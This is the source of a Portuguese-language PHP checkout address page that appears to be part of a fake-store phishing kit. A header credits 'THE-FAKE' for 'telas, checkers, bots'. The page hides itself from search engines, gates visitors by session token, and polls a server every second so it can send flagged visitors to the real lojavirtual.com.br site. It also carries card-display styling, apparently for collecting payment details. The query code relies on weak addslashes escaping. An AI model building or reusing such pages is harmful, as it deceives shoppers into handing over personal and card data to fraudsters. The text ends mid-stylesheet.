<?php

session_start();

require_once("api/db.php");
require_once("api/facebook_pixel.php");

if (!isset($_GET["produto"])) {
session_destroy();
header("Location: https://www.lojavirtual.com.br/");
exit();
}else{

$id = addslashes($_GET["produto"]);

$sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
if(($sqlx ? mysqli_num_rows($sqlx) : 0) > 0){




## sesison
if($_SESSION['session_checkout'] > time()){



		$sql = mysqli_query($conn, "SELECT * from config");
		$endereco = "";
		$cnpj = "";
		 while($sql && $row = mysqli_fetch_array($sql)){
		   	   $cor = $row["cor"];
		   	   $nome = $row["nome"];
		   	   $endereco = isset($row["endereco"]) ? $row["endereco"] : "";
		   	   $cnpj = isset($row["cnpj"]) ? $row["cnpj"] : "";
		      }

        ############################


	    $sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
		 while($sql1 && $row1 = mysqli_fetch_array($sql1)){
		   	   $codigo = $row1["codigo"];
		   	   $nomeproduto = $row1["nome"];
		   	   $valor = $row1["valor"];
		   	   $img = $row1["img"];
		   	   $oferta = $row1["oferta"];
		   	   $desconto = $row1["desconto"];
		      }

			  if($oferta==1){
			   $ofertaTime = "block";
			   $ofertaTexto = "none";
			  }else if($oferta==0){
			   $ofertaTime = "none";
			   $ofertaTexto = "block";
			  }





}//## session
else{
session_destroy();
$newuser = md5(time()).time();
$pro = $_GET["produto"];
header("Location: /?newaccess=$newuser&id=$pro");
}




}else{
session_destroy();
header("Location: https://www.lojavirtual.com.br/");
exit();
}


}

?>
<!DOCTYPE html>
<html class="no-js" lang="pt-br">
<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<meta name="robots" content="noindex,nofollow">
<?php echo fb_pixel_base_code(); ?>
<script src="./js/jquery.js?fake1=<?php echo time();?>"></script>
	<script src="./js/address.js?fake1=<?php echo time();?>"></script>
					<script>
					    $(document).ready(function() {
					        const v_sel = JSON.parse(localStorage.getItem('variacoes_selecionadas') || '{}');

					        // 1. Substituir o Título do Produto
					        if(v_sel.titulo_selecionado && v_sel.titulo_selecionado.trim() !== "") {
					            $('.item-name').each(function() {
					                const txt = $(this).text();
					                if(!txt.includes('Entrega Segura') && !txt.includes('Garantia') && !txt.includes('Mercado Pago')) {
					                    $(this).html('<b>' + v_sel.titulo_selecionado + '</b>');
					                }
					            });
					        }

					        // 2. Substituir a Imagem do Produto
					        if(v_sel.imagem_selecionada && v_sel.imagem_selecionada.trim() !== "") {
					            $('.thumb-product').each(function() {
					                const src = $(this).attr('src') || "";
					                if(!src.includes('trofeu.png') && !src.includes('mao.png') && !src.includes('mp.png')) {
					                    $(this).attr('src', v_sel.imagem_selecionada);
					                }
					            });
					        }

					        // 3. Exibir apenas variações REAIS e filtrar campos de controle
					        let v_html = '';
					        for (const key in v_sel) {
					            // Ignorar campos internos de controle
					            if(key === 'titulo_selecionado' || key === 'imagem_selecionada' || key === 'titulo' || key === 'img') {
					                continue;
					            }

					            // Formatar o nome do campo para exibição
					            let label = key.charAt(0).toUpperCase() + key.slice(1);
					            if(key === 'ram') label = 'RAM';

					            v_html += `<div>${label}: <strong>${v_sel[key]}</strong></div>`;
					        }

					        $('#summaryVariacoes').html(v_html);
					    });
					</script>

<script src="./arquivos/jquery.js?fake1=<?php echo time();?>"></script>
<script src="./arquivos/js.js?fake1=<?php echo time();?>"></script>

<link rel="stylesheet" href="./arquivos/fa.css?fake2=<?php echo time();?>">
<link rel="stylesheet" href="./arquivos/app-d77bdb0726.css?fake3=<?php echo time();?>">
<link rel="stylesheet" href="./arquivos/auxiliar.css?fake4=<?php echo time();?>">

<title>Endereço</title>



<script type="text/javascript">
var code = "<?php echo $codigo;?>";
setInterval(()=>{
$.post("api/index.php",{api:"online", cliente:"address"},function(retorno){
if(retorno==1){ window.location.href="https://www.lojavirtual.com.br/"; } else{ }
});
}, 1000);

  window.checkout = window.checkout || {};
  window.session = {  auth: {}, customer: {}, flux: {}, sender_hash: '' }
  window.conversionPixels = (window.conversionPixels || []).concat([{"id":244963,"billet":1,"pix":1,"service":"","pixel_id":"","conversion_label":null,"value_type":"total_products","facebook_type":"default"}]);
  window.gandalf = {active: true}

</script>


<script>
/*******************************
SCRIPT DESENVOLVIDO POR THE-FAKE
PROGRAMAÇÃO EM GERAL - TELAS, CHECKERS, BOTS
DIA: 04/11/2022
HORA: 21:51 PM
********************************/


    var quantidade2 = 0;   // QUANTIDADE QUE VEM DA PAGINA ANTERIOR
    var valorProduto2 = "<?php echo $valor;?>"; // PREXO FIXO DO DATA BASE

    window.onload=function(){
    var jsonString = localStorage.getItem("lojavirtual");
    var date = JSON.parse(jsonString);
	var xt = valorProduto2 * 1;
	var info = xt.toLocaleString('pt-br', {minimumFractionDigits: 2});
	document.getElementById("valorTotal2").innerHTML="R$ "+date.precoFinal; // ID PRODUTOS - PREÇO PEGO NO LOCAL
	document.getElementById("valorTotal3").innerHTML="R$ "+date.precoFinal; // ID TOTAL - PREÇO PEGO NO LOCAL
	document.getElementById("valorTotal4").innerHTML="R$ "+info; // ID VALOR FIXO
	document.getElementById("quantityHTML").value=date.quantos; // QUANTIDADE NO CARRINHO
    document.getElementById("resumoQtd").innerHTML="("+date.quantos+")"; // QUANTIDADE NO CARRINHO
	quantidade2=date.quantos;
    }



  function addQtd(){
  quantidade2++;
  document.getElementById("resumoQtd").innerHTML="("+quantidade2+")";
  document.getElementById("quantityHTML").value=quantidade2;

  if(valorProduto2.length > 7){
  var off1 = valorProduto2.replace(".","");
  var off1 = off1.replace(",",".");
  }
  else if(valorProduto2.length < 7){
  var off1 = valorProduto2.replace(",",".");
  }else{
  console.log("erros");
  }

  var multiplicar2 = off1 * quantidade2;
  var totaValor2 = multiplicar2.toLocaleString('pt-br', {minimumFractionDigits: 2});

  document.getElementById("valorTotal3").innerHTML="R$ "+totaValor2;
  document.getElementById("valorTotal2").innerHTML="R$ "+totaValor2;

  var dados2 = {precoFinal:totaValor2, quantos:quantidade2};
  localStorage.setItem('lojavirtual', JSON.stringify(dados2));

  }



  //=========================


  function removeQtd(){
  if(quantidade2==1){
  }
  else{
  quantidade2--;
  document.getElementById("resumoQtd").innerHTML="("+quantidade2+")";
  document.getElementById("quantityHTML").value=quantidade2;

  if(valorProduto2.length > 7){
  var off1 = valorProduto2.replace(".","");
  var off1 = off1.replace(",",".");
  }
  else if(valorProduto2.length < 7){
  var off1 = valorProduto2.replace(",",".");
  }else{
  console.log("erros");
  }

  var multiplicar2 = off1 * quantidade2;
  var totaValor2 = multiplicar2.toLocaleString('pt-br', {minimumFractionDigits: 2});

  document.getElementById("valorTotal3").innerHTML="R$ "+totaValor2;
  document.getElementById("valorTotal2").innerHTML="R$ "+totaValor2;

  var dados2 = {precoFinal:totaValor2, quantos:quantidade2};
  localStorage.setItem('lojavirtual', JSON.stringify(dados2));
  }

  }
</script>






<style>
    :root {
        --default-radius: 5px;

        /* Fonts */
        --texts-font-family: Rubik, sans-serif;
        --titles-font-family: Rubik, sans-serif;
        --titles-uppercase: initial;
        --btn-uppercase: initial;

        /* Font weights */
        --texts-font-regular: 400;
        --texts-font-medium: 500;
        --texts-font-bold: 700;

        --titles-font-regular: 400;
        --titles-font-medium: 500;
        --titles-font-bold: 700;

        /* buttons */
        --btn-primary-bg-color: #ce112d;
        --btn-primary-txt-color: #FFFFFF;
        --btn-secondary-bg-color: #ce112d;
        --btn-secondary-txt-color: #FFFFFF;
        --btn-tertiary-txt-color: #725BC2;

        /* header and stopwatch */
        --stopwatch-txt-color: #FFFFFF;
        --stopwatch-timer-color: #FFC926;
        --stopwatch-bg-color: #ce112d;
        --header-bg-color: #FFFFFF;
        --header-el-color: #898792;

        /* discount-tag */
        --discount-tag-bg-color: #ce112d;
        --discount-tag-txt-color: #FFFFFF;

        /* step-tag */
        --step-tag-bg-color: #333333;
        --step-tag-txt-color: #FFFFFF;

        --desktop-active-color: #999999;
        --cart-total-color: #ce112d;
        --title-color: #666666;
        --description-color: #666666;

        /* footer */
        --footer-border-color: #d0d0d0;
        --footer-bg-color: #F7F7F8;
        --footer-txt-color: #666666;
    }
</style>
<!-- Custom css -->
<style>
    body.custom-checkout:not(.v2) header .holder-logo.default {
    pointer-events: auto!important;
}

body.custom-checkout header .item-security {
    display: none!important;
}
</style>
<style type="text/css">.jp-card.jp-card-safari.jp-card-identified .jp-card-front:before, .jp-card.jp-card-safari.jp-card-identified .jp-card-back:before {
  background-image: repeating-linear-gradient(45deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(135deg, rgba(255, 255, 255, 0.05) 1px, rgba(255, 255, 255, 0) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.03) 4px), repeating-linear-gradient(90deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(210deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), -webkit-linear-gradient(-245deg, rgba(255, 255, 255, 0) 50%, rgba(255, 255, 255, 0.2) 70%, rgba(255, 255, 255, 0) 90%);
  background-image: repeating-linear-gradient(45deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(135deg, rgba(255, 255, 255, 0.05) 1px, rgba(255, 255, 255, 0) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.03) 4px), repeating-linear-gradient(90deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(210deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), linear-gradient(-25deg, rgba(255, 255, 255, 0) 50%, rgba(255, 255, 255, 0.2) 70%, rgba(255, 255, 255, 0) 90%); }

.jp-card.jp-card-ie-10.jp-card-flipped, .jp-card.jp-card-ie-11.jp-card-flipped {
  -webkit-transform: 0deg;
  -moz-transform: 0deg;
  -ms-transform: 0deg;
  -o-transform: 0deg;
  transform: 0deg; }
  .jp-card.jp-card-ie-10.jp-card-flipped .jp-card-front, .jp-card.jp-card-ie-11.jp-card-flipped .jp-card-front {
    -webkit-transform: rotateY(0deg);
    -moz-transform: rotateY(0deg);
    -ms-transform: rotateY(0deg);
    -o-transform: rotateY(0deg);
    transform: rotateY(0deg); }
  .jp-card.jp-card-ie-10.jp-card-flipped .jp-card-back, .jp-card.jp-card-ie-11.jp-card-flipped .jp-card-back {
    -webkit-transform: rotateY(0deg);
    -moz-transform: rotateY(0deg);
    -ms-transform: rotateY(0deg);
    -o-transform: rotateY(0deg);
    transform: rotateY(0deg); }
    .jp-card.jp-card-ie-10.jp-card-flipped .jp-card-back:after, .jp-card.jp-card-ie-11.jp-card-flipped .jp-card-back:after {
      left: 18%; }
    .jp-card.jp-card-ie-10.jp-card-flipped .jp-card-back .jp-card-cvc, .jp-card.jp-card-ie-11.jp-card-flipped .jp-card-back .jp-card-cvc {
      -webkit-transform: rotateY(180deg);
      -moz-transform: rotateY(180deg);
      -ms-transform: rotateY(180deg);
      -o-transform: rotateY(180deg);
      transform: rotateY(180deg);
      left: 5%; }
    .jp-card.jp-card-ie-10.jp-card-flipped .jp-card-back .jp-card-shiny, .jp-card.jp-card-ie-11.jp-card-flipped .jp-card-back .jp-card-shiny {
      left: 84%; }
      .jp-card.jp-card-ie-10.jp-card-flipped .jp-card-back .jp-card-shiny:after, .jp-card.jp-card-ie-11.jp-card-flipped .jp-card-back .jp-card-shiny:after {
        left: -480%;
        -webkit-transform: rotateY(180deg);
        -moz-transform: rotateY(180deg);
        -ms-transform: rotateY(180deg);
        -o-transform: rotateY(180deg);
        transform: rotateY(180deg); }

.jp-card.jp-card-ie-10.jp-card-amex .jp-card-back, .jp-card.jp-card-ie-11.jp-card-amex .jp-card-back {
  display: none; }

.jp-card-logo {
  height: 36px;
  width: 60px;
  font-style: italic; }
  .jp-card-logo, .jp-card-logo:before, .jp-card-logo:after {
    box-sizing: border-box; }

.jp-card-logo.jp-card-amex {
  text-transform: uppercase;
  font-size: 4px;
  font-weight: bold;
  color: white;
  background-image: repeating-radial-gradient(circle at center, #FFF 1px, #999 2px);
  background-image: repeating-radial-gradient(circle at center, #FFF 1px, #999 2px);
  border: 1px solid #EEE; }
  .jp-card-logo.jp-card-amex:before, .jp-card-logo.jp-card-amex:after {
    width: 28px;
    display: block;
    position: absolute;
    left: 16px; }
  .jp-card-logo.jp-card-amex:before {
    height: 28px;
    content: "american";
    top: 3px;
    text-align: left;
    padding-left: 2px;
    padding-top: 11px;
    background: #267AC3; }
  .jp-card-logo.jp-card-amex:after {
    content: "express";
    bottom: 11px;
    text-align: right;
    padding-right: 2px; }

.jp-card.jp-card-amex.jp-card-flipped {
  -webkit-transform: none;
  -moz-transform: none;
  -ms-transform: none;
  -o-transform: none;
  transform: none; }

.jp-card.jp-card-amex.jp-card-identified .jp-card-front:before, .jp-card.jp-card-amex.jp-card-identified .jp-card-back:before {
  background-color: #108168; }

.jp-card.jp-card-amex.jp-card-identified .jp-card-front .jp-card-logo.jp-card-amex {
  opacity: 1; }

.jp-card.jp-card-amex.jp-card-identified .jp-card-front .jp-card-cvc {
  visibility: visible; }

.jp-card.jp-card-amex.jp-card-identified .jp-card-front:after {
  opacity: 1; }

.jp-card-logo.jp-card-discover {
  background: #FF6600;
  color: #111;
  text-transform: uppercase;
  font-style: normal;
  font-weight: bold;
  font-size: 10px;
  text-align: center;
  overflow: hidden;
  z-index: 1;
  padding-top: 9px;
  letter-spacing: .03em;
  border: 1px solid #EEE; }
  .jp-card-logo.jp-card-discover:before, .jp-card-logo.jp-card-discover:after {
    content: " ";
    display: block;
    position: absolute; }
  .jp-card-logo.jp-card-discover:before {
    background: white;
    width: 200px;
    height: 200px;
    border-radius: 200px;
    bottom: -5%;
    right: -80%;
    z-index: -1; }
  .jp-card-logo.jp-card-discover:after {
    width: 8px;
    height: 8px;
    border-radius: 4px;
    top: 10px;
    left: 27px;
    background-color: #FF6600;
    background-image: -webkit-radial-gradient(#FF6600, #fff);
    background-image: radial-gradient(  #FF6600, #fff);
    content: "network";
    font-size: 4px;
    line-height: 24px;
    text-indent: -7px; }

.jp-card .jp-card-front .jp-card-logo.jp-card-discover {
  right: 12%;
  top: 18%; }

.jp-card.jp-card-discover.jp-card-identified .jp-card-front:before, .jp-card.jp-card-discover.jp-card-identified .jp-card-back:before {
  background-color: #86B8CF; }

.jp-card.jp-card-discover.jp-card-identified .jp-card-logo.jp-card-discover {
  opacity: 1; }

.jp-card.jp-card-discover.jp-card-identified .jp-card-front:after {
  -webkit-transition: 400ms;
  -moz-transition: 400ms;
  transition: 400ms;
  content: " ";
  display: block;
  background-color: #FF6600;
  background-image: -webkit-linear-gradient(#FF6600, #ffa366, #FF6600);
  background-image: linear-gradient(#FF6600, #ffa366, #FF6600);
  height: 50px;
  width: 50px;
  border-radius: 25px;
  position: absolute;
  left: 100%;
  top: 15%;
  margin-left: -25px;
  box-shadow: inset 1px 1px 3px 1px rgba(0, 0, 0, 0.5); }

.jp-card-logo.jp-card-visa {
  background: white;
  text-transform: uppercase;
  color: #1A1876;
  text-align: center;
  font-weight: bold;
  font-size: 15px;
  line-height: 18px; }
  .jp-card-logo.jp-card-visa:before, .jp-card-logo.jp-card-visa:after {
    content: " ";
    display: block;
    width: 100%;
    height: 25%; }
  .jp-card-logo.jp-card-visa:before {
    background: #1A1876; }
  .jp-card-logo.jp-card-visa:after {
    background: #E79800; }

.jp-card.jp-card-visa.jp-card-identified .jp-card-front:before, .jp-card.jp-card-visa.jp-card-identified .jp-card-back:before {
  background-color: #191278; }

.jp-card.jp-card-visa.jp-card-identified .jp-card-logo.jp-card-visa {
  opacity: 1; }

.jp-card-logo.jp-card-mastercard {
  color: white;
  font-weight: bold;
  text-align: center;
  font-size: 9px;
  line-height: 36px;
  z-index: 1;
  text-shadow: 1px 1px rgba(0, 0, 0, 0.6); }
  .jp-card-logo.jp-card-mastercard:before, .jp-card-logo.jp-card-mastercard:after {
    content: " ";
    display: block;
    width: 36px;
    top: 0;
    position: absolute;
    height: 36px;
    border-radius: 18px; }
  .jp-card-logo.jp-card-mastercard:before {
    left: 0;
    background: #FF0000;
    z-index: -1; }
  .jp-card-logo.jp-card-mastercard:after {
    right: 0;
    background: #FFAB00;
    z-index: -2; }

.jp-card.jp-card-mastercard.jp-card-identified .jp-card-front .jp-card-logo.jp-card-mastercard, .jp-card.jp-card-mastercard.jp-card-identified .jp-card-back .jp-card-logo.jp-card-mastercard {
  box-shadow: none; }

.jp-card.jp-card-mastercard.jp-card-identified .jp-card-front:before, .jp-card.jp-card-mastercard.jp-card-identified .jp-card-back:before {
  background-color: #0061A8; }

.jp-card.jp-card-mastercard.jp-card-identified .jp-card-logo.jp-card-mastercard {
  opacity: 1; }

.jp-card-logo.jp-card-maestro {
  color: white;
  font-weight: bold;
  text-align: center;
  font-size: 14px;
  line-height: 36px;
  z-index: 1;
  text-shadow: 1px 1px rgba(0, 0, 0, 0.6); }
  .jp-card-logo.jp-card-maestro:before, .jp-card-logo.jp-card-maestro:after {
    content: " ";
    display: block;
    width: 36px;
    top: 0;
    position: absolute;
    height: 36px;
    border-radius: 18px; }
  .jp-card-logo.jp-card-maestro:before {
    left: 0;
    background: #0064CB;
    z-index: -1; }
  .jp-card-logo.jp-card-maestro:after {
    right: 0;
    background: #CC0000;
    z-index: -2; }

.jp-card.jp-card-maestro.jp-card-identified .jp-card-front .jp-card-logo.jp-card-maestro, .jp-card.jp-card-maestro.jp-card-identified .jp-card-back .jp-card-logo.jp-card-maestro {
  box-shadow: none; }

.jp-card.jp-card-maestro.jp-card-identified .jp-card-front:before, .jp-card.jp-card-maestro.jp-card-identified .jp-card-back:before {
  background-color: #0B2C5F; }

.jp-card.jp-card-maestro.jp-card-identified .jp-card-logo.jp-card-maestro {
  opacity: 1; }

.jp-card-logo.jp-card-dankort {
  width: 60px;
  height: 36px;
  padding: 3px;
  border-radius: 8px;
  border: #000000 1px solid;
  background-color: #FFFFFF; }
  .jp-card-logo.jp-card-dankort .dk {
    position: relative;
    width: 100%;
    height: 100%;
    overflow: hidden; }
    .jp-card-logo.jp-card-dankort .dk:before {
      background-color: #ED1C24;
      content: '';
      position: absolute;
      width: 100%;
      height: 100%;
      display: block;
      border-radius: 6px; }
    .jp-card-logo.jp-card-dankort .dk:after {
      content: '';
      position: absolute;
      top: 50%;
      margin-top: -7.7px;
      right: 0;
      width: 0;
      height: 0;
      border-style: solid;
      border-width: 7px 7px 10px 0;
      border-color: transparent #ED1C24 transparent transparent;
      z-index: 1; }
  .jp-card-logo.jp-card-dankort .d, .jp-card-logo.jp-card-dankort .k {
    position: absolute;
    top: 50%;
    width: 50%;
    display: block;
    height: 15.4px;
    margin-top: -7.7px;
    background: white; }
  .jp-card-logo.jp-card-dankort .d {
    left: 0;
    border-radius: 0 8px 10px 0; }
    .jp-card-logo.jp-card-dankort .d:before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      display: block;
      background: #ED1C24;
      border-radius: 2px 4px 6px 0px;
      height: 5px;
      width: 7px;
      margin: -3px 0 0 -4px; }
  .jp-card-logo.jp-card-dankort .k {
    right: 0; }
    .jp-card-logo.jp-card-dankort .k:before, .jp-card-logo.jp-card-dankort .k:after {
      content: '';
      position: absolute;
      right: 50%;
      width: 0;
      height: 0;
      border-style: solid;
      margin-right: -1px; }
    .jp-card-logo.jp-card-dankort .k:before {
      top: 0;
      border-width: 8px 5px 0 0;
      border-color: #ED1C24 transparent transparent transparent; }
    .jp-card-logo.jp-card-dankort .k:after {
      bottom: 0;
      border-width: 0 5px 8px 0;
      border-color: transparent transparent #ED1C24 transparent; }

.jp-card.jp-card-dankort.jp-card-identified .jp-card-front:before, .jp-card.jp-card-dankort.jp-card-identified .jp-card-back:before {
  background-color: #0055C7; }

.jp-card.jp-card-dankort.jp-card-identified .jp-card-logo.jp-card-dankort {
  opacity: 1; }

.jp-card-logo.jp-card-elo {
  height: 50px;
  width: 50px;
  border-radius: 100%;
  background: black;
  color: white;
  text-align: center;
  text-transform: lowercase;
  font-size: 21px;
  font-style: normal;
  letter-spacing: 1px;
  font-weight: bold;
  padding-top: 13px; }
  .jp-card-logo.jp-card-elo .e, .jp-card-logo.jp-card-elo .l, .jp-card-logo.jp-card-elo .o {
    display: inline-block;
    position: relative; }
  .jp-card-logo.jp-card-elo .e {
    -webkit-transform: rotate(-15deg);
    -moz-transform: rotate(-15deg);
    -ms-transform: rotate(-15deg);
    -o-transform: rotate(-15deg);
    transform: rotate(-15deg); }
  .jp-card-logo.jp-card-elo .o {
    position: relative;
    display: inline-block;
    width: 12px;
    height: 12px;
    right: 0;
    top: 7px;
    border-radius: 100%;
    background-image: -webkit-linear-gradient( yellow 50%, red 50%);
    background-image: linear-gradient( yellow 50%, red 50%);
    -webkit-transform: rotate(40deg);
    -moz-transform: rotate(40deg);
    -ms-transform: rotate(40deg);
    -o-transform: rotate(40deg);
    transform: rotate(40deg);
    text-indent: -9999px; }
    .jp-card-logo.jp-card-elo .o:before {
      content: "";
      position: absolute;
      width: 49%;
      height: 49%;
      background: black;
      border-radius: 100%;
      text-indent: -99999px;
      top: 25%;
      left: 25%; }

.jp-card.jp-card-elo.jp-card-identified .jp-card-front:before, .jp-card.jp-card-elo.jp-card-identified .jp-card-back:before {
  background-color: #6F6969; }

.jp-card.jp-card-elo.jp-card-identified .jp-card-logo.jp-card-elo {
  opacity: 1; }

.jp-card-container {
  -webkit-perspective: 1000px;
  -moz-perspective: 1000px;
  perspective: 1000px;
  width: 350px;
  max-width: 100%;
  height: 200px;
  margin: auto;
  z-index: 1;
  position: relative; }

.jp-card {
  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
  line-height: 1;
  position: relative;
  width: 100%;
  height: 100%;
  min-width: 315px;
  border-radius: 10px;
  -webkit-transform-style: preserve-3d;
  -moz-transform-style: preserve-3d;
  -ms-transform-style: preserve-3d;
  -o-transform-style: preserve-3d;
  transform-style: preserve-3d;
  -webkit-transition: all 400ms linear;
  -moz-transition: all 400ms linear;
  transition: all 400ms linear; }
  .jp-card > *, .jp-card > *:before, .jp-card > *:after {
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    font-family: inherit; }
  .jp-card.jp-card-flipped {
    -webkit-transform: rotateY(180deg);
    -moz-transform: rotateY(180deg);
    -ms-transform: rotateY(180deg);
    -o-transform: rotateY(180deg);
    transform: rotateY(180deg);
    -webkit-backface-visibility: hidden;
    backface-visibility: hidden; }
  .jp-card .jp-card-front, .jp-card .jp-card-back {
    -webkit-backface-visibility: hidden;
    backface-visibility: hidden;
    -webkit-transform-style: preserve-3d;
    -moz-transform-style: preserve-3d;
    -ms-transform-style: preserve-3d;
    -o-transform-style: preserve-3d;
    transform-style: preserve-3d;
    -webkit-transition: all 400ms linear;
    -moz-transition: all 400ms linear;
    transition: all 400ms linear;
    width: 100%;
    height: 100%;
    position: absolute;
    top: 0;
    left: 0;
    overflow: hidden;
    border-radius: 10px;
    background: #DDD; }
    .jp-card .jp-card-front:before, .jp-card .jp-card-back:before {
      content: " ";
      display: block;
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      opacity: 0;
      border-radius: 10px;
      -webkit-transition: all 400ms ease;
      -moz-transition: all 400ms ease;
      transition: all 400ms ease; }
    .jp-card .jp-card-front:after, .jp-card .jp-card-back:after {
      content: " ";
      display: block; }
    .jp-card .jp-card-front .jp-card-display, .jp-card .jp-card-back .jp-card-display {
      color: white;
      font-weight: normal;
      opacity: 0.5;
      -webkit-transition: opacity 400ms linear;
      -moz-transition: opacity 400ms linear;
      transition: opacity 400ms linear; }
      .jp-card .jp-card-front .jp-card-display.jp-card-focused, .jp-card .jp-card-back .jp-card-display.jp-card-focused {
        opacity: 1;
        font-weight: 700; }
    .jp-card .jp-card-front .jp-card-cvc, .jp-card .jp-card-back .jp-card-cvc {
      font-family: "Bitstream Vera Sans Mono", Consolas, Courier, monospace;
      font-size: 14px; }
    .jp-card .jp-card-front .jp-card-shiny, .jp-card .jp-card-back .jp-card-shiny {
      width: 50px;
      height: 35px;
      border-radius: 5px;
      background: #CCC;
      position: relative; }
      .jp-card .jp-card-front .jp-card-shiny:before, .jp-card .jp-card-back .jp-card-shiny:before {
        content: " ";
        display: block;
        width: 70%;
        height: 60%;
        border-top-right-radius: 5px;
        border-bottom-right-radius: 5px;
        background: #d9d9d9;
        position: absolute;
        top: 20%; }
  .jp-card .jp-card-front .jp-card-logo {
    position: absolute;
    opacity: 0;
    right: 5%;
    top: 8%;
    -webkit-transition: 400ms;
    -moz-transition: 400ms;
    transition: 400ms; }
  .jp-card .jp-card-front .jp-card-lower {
    width: 80%;
    position: absolute;
    left: 10%;
    bottom: 30px; }
    @media only screen and (max-width: 480px) {
      .jp-card .jp-card-front .jp-card-lower {
        width: 90%;
        left: 5%; } }
    .jp-card .jp-card-front .jp-card-lower .jp-card-cvc {
      visibility: hidden;
      float: right;
      position: relative;
      bottom: 5px; }
    .jp-card .jp-card-front .jp-card-lower .jp-card-number {
      font-family: "Bitstream Vera Sans Mono", Consolas, Courier, monospace;
      font-size: 24px;
      clear: both;
      margin-bottom: 30px; }
    .jp-card .jp-card-front .jp-card-lower .jp-card-expiry {
      font-family: "Bitstream Vera Sans Mono", Consolas, Courier, monospace;
      letter-spacing: 0em;
      position: relative;
      float: right;
      width: 25%; }
      .jp-card .jp-card-front .jp-card-lower .jp-card-expiry:before, .jp-card .jp-card-front .jp-card-lower .jp-card-expiry:after {
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        font-weight: bold;
        font-size: 7px;
        white-space: pre;
        display: block;
        opacity: .5; }
      .jp-card .jp-card-front .jp-card-lower .jp-card-expiry:before {
        content: attr(data-before);
        margin-bottom: 2px;
        font-size: 7px;
        text-transform: uppercase; }
      .jp-card .jp-card-front .jp-card-lower .jp-card-expiry:after {
        position: absolute;
        content: attr(data-after);
        text-align: right;
        right: 100%;
        margin-right: 5px;
        margin-top: 2px;
        bottom: 0; }
    .jp-card .jp-card-front .jp-card-lower .jp-card-name {
      text-transform: uppercase;
      font-family: "Bitstream Vera Sans Mono", Consolas, Courier, monospace;
      font-size: 20px;
      max-height: 45px;
      position: absolute;
      bottom: 0;
      width: 190px;
      display: -webkit-box;
      -webkit-line-clamp: 2;
      -webkit-box-orient: horizontal;
      overflow: hidden;
      text-overflow: ellipsis; }
  .jp-card .jp-card-back {
    -webkit-transform: rotateY(180deg);
    -moz-transform: rotateY(180deg);
    -ms-transform: rotateY(180deg);
    -o-transform: rotateY(180deg);
    transform: rotateY(180deg); }
    .jp-card .jp-card-back .jp-card-bar {
      background-color: #444;
      background-image: -webkit-linear-gradient(#444, #333);
      background-image: linear-gradient(#444, #333);
      width: 100%;
      height: 20%;
      position: absolute;
      top: 10%; }
    .jp-card .jp-card-back:after {
      content: " ";
      display: block;
      background-color: #FFF;
      background-image: -webkit-linear-gradient(#FFF, #FFF);
      background-image: linear-gradient(#FFF, #FFF);
      width: 80%;
      height: 16%;
      position: absolute;
      top: 40%;
      left: 2%; }
    .jp-card .jp-card-back .jp-card-cvc {
      position: absolute;
      top: 40%;
      left: 85%;
      -webkit-transition-delay: 600ms;
      -moz-transition-delay: 600ms;
      transition-delay: 600ms; }
    .jp-card .jp-card-back .jp-card-shiny {
      position: absolute;
      top: 66%;
      left: 2%; }
      .jp-card .jp-card-back .jp-card-shiny:after {
        content: "This card has been issued by Jesse Pollak and is licensed for anyone to use anywhere for free.AIt comes with no warranty.A  For support issues, please visit: github.com/jessepollak/card.";
        position: absolute;
        left: 120%;
        top: 5%;
        color: white;
        font-size: 7px;
        width: 230px;
        opacity: .5; }
  .jp-card.jp-card-identified {
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.3); }
    .jp-card.jp-card-identified .jp-card-front, .jp-card.jp-card-identified .jp-card-back {
      background-color: #000;
      background-color: rgba(0, 0, 0, 0.5); }
      .jp-card.jp-card-identified .jp-card-front:before, .jp-card.jp-card-identified .jp-card-back:before {
        -webkit-transition: all 400ms ease;
        -moz-transition: all 400ms ease;
        transition: all 400ms ease;
